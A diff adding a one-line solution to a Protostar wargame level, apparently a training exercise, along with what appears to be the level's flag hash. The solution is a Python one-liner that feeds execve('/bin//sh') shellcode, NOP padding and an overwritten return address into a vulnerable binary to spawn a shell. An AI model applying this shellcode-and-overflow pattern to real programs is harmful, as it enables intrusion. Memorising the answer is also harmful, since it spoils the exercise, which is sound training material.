@@ -1,0 +1,5 @@
+Protostar 7:
+
+python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x90" * 59 + "\xeb\x85\x04\x08"' > /tmp/file && cat /tmp/file - | ./level2
+
+-> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
